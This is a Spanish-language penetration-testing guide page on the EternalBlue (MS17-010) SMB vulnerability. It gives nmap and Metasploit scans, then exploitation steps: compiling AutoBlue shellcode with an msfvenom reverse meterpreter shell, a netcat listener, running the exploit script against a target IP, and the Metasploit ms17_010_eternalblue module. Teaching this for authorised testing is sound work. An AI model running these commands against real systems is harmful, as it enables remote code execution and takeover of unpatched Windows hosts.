# Explotación de la vulnerabilidad MS17-010 de SMB (EternalBlue)

**EternalBlue (MS17-010/CVE-2017-0144)** es el nombre que recibe un conjunto de vulnerabilidades y exploits de Windows que permiten ejecutar código de forma remota y obtener acceso al sistema y a la red de la que forma parte. El exploit EternalBlue aprovecha una vulnerabilidad en el protocolo SMBv1 de Windows que permite a los atacantes enviar paquetes que facilitan la ejecución de comandos arbitrarios. Afecta a múltiples versiones de Windows: Vista, 7, Server 2008, 8.1, Server 2012, 10, Server 2016.

## Análisis de vulnerabilidades: eternalblue

Para comprobar si el sistema objetivo es vulnerable a *EternalBlue*, podemos usar los módulos auxiliares de `Metasploit`. Otras formas de comprobarlo son los `NSE` o herramientas como `Nessus` y `OpenVAS`.

**Con nmap**

```bash
nmap -p445 --script smb-vuln-ms17-010 <IP>
```

**Con metasploit**

```bash
msf > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts <IP>
msf auxiliary(scanner/smb/smb_ms17_010) > run
```

## Explotación

Existen varias formas de aprovechar esta vulnerabilidad, tanto de forma manual con exploits existentes, como de forma automatizada a través de metasploit.

### AutoBlue-MS17-010

Para usar este exploit necesitamos clonar su [repositorio en github](https://github.com/3ndg4me/autoblue-ms17-010). Proporciona exploits para varias versiones de Windows, además de un scritp que comprueba si el sistema es vulnerable.

El primer paso es entrar al directorio `shellcode` y ejecutar el script `shell_prep.sh`, que complilará el shellcode. Por ejemplo:

```
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
<YOUR-IP>
LPORT you want x64 to listen on:
<SOME PORT>
LPORT you want x86 to listen on:
<SOME OTHER PORT>
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
```

Creamos un listener con `netcat`:

```bash
nc -nvlp 1234
```

Por último, para ejecutarlo:

```bash
python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
```

### Metasploit: ms17_010_eternalblue

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts <IP>
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
```

[⟵ Anterior](../../05_sistema.md#explotación-windows)
